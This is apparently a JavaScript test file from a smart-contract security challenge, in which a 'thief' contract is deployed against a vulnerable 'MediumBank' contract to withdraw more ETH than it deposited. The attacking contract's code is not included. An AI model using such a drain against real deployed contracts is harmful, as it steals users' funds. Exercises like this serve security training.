const { expect } = require('chai');
const { ethers, waffle } = require('hardhat');

describe('MediumBank', function () {
  const provider = waffle.provider;

  const depositAmount = ethers.utils.parseEther('100');

  let deployer, thief, victim;
  let mediumBankContract;

  before(async function () {
    //
    // SETUP SCENARIO - NO NEED TO CHANGE ANYTHING HERE
    //

    [deployer, thief, victim] = await ethers.getSigners();

    const MediumBankContractFactory = await ethers.getContractFactory('MediumBank');
    mediumBankContract = await MediumBankContractFactory.deploy();
    await mediumBankContract.deployed();

    mediumBankContract = await mediumBankContract.connect(victim);

    const depositTxn = await mediumBankContract.deposit({ value: depositAmount });
    await depositTxn.wait();

    expect((await provider.getBalance(mediumBankContract.address)).eq(depositAmount)).to.be.true;
  });

  describe('EXPLOIT', function () {
    let thiefContract;
    let thiefBeginningBalance;
    let thiefEndingBalance;

    before(async function () {
      thiefBeginningBalance = await provider.getBalance(thief.address);
    });

    before(async function () {
      //
      // CHALLENGE: SETUP AND EXECUTE THE EXPLOIT HERE
      //

      const MediumThiefContractFactory = await ethers.getContractFactory('MediumThief', thief);
      thiefContract = await MediumThiefContractFactory.deploy(mediumBankContract.address);
      await thiefContract.deployed();

      const stealTxn = await thiefContract.steal({ value: depositAmount });
      await stealTxn.wait();

      thiefEndingBalance = await provider.getBalance(thief.address);
    });

    it('thief should be able to withdraw more ETH than deposited via a contract', async function () {
      // not checking exact amounts here due to gas costs offseting precise balances
      expect(thiefEndingBalance.gt(thiefBeginningBalance)).to.be.true;

      console.log(`Thief beginning balance: ${ethers.utils.formatEther(thiefBeginningBalance)}`);
      console.log(`Thief ending balance: ${ethers.utils.formatEther(thiefEndingBalance)}`);
    });
  });
});
